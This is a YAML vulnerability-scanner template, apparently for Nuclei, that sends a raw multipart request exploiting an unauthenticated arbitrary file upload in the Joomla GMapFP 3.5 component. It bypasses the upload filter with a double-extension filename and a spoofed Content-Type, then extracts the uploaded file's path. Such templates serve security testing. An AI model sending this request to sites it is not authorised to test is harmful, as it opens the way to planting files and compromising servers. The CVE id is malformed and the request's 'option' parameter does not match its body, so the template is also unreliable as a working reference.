id: CVE-2020-239722
info:
  author: dwisiswant0
  description: 'An attacker can access the upload function of the application

    without authenticating to the application and also can upload

    files due the issues of unrestricted file upload which can be

    bypassed by changing Content-Type & name file too double ext.

    '
  name: Joomla! Component GMapFP 3.5 - Unauthenticated Arbitrary File Upload
  reference: https://www.exploit-db.com/exploits/49129
  severity: high
  tags: cve,cve2020,joomla
requests:
- extractors:
  - part: body
    regex:
    - window\.opener\.(changeDisplayImage|addphoto)\("(.*?)"\);
    type: regex
  raw:
  - 'POST /index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Referer: https://{{Hostname}}

    Connection: close


    ------WebKitFormBoundarySHHbUsfCoxlX1bpS

    Content-Disposition: form-data; name="option"


    com_gmapfp

    ------WebKitFormBoundarySHHbUsfCoxlX1bpS

    Content-Disposition: form-data; name="image1"; filename="nuclei.html.gif"

    Content-Type: text/html


    projectdiscovery


    ------WebKitFormBoundarySHHbUsfCoxlX1bpS

    Content-Disposition: form-data; name="no_html"


    no_html

    ------WebKitFormBoundarySHHbUsfCoxlX1bpS--

    '
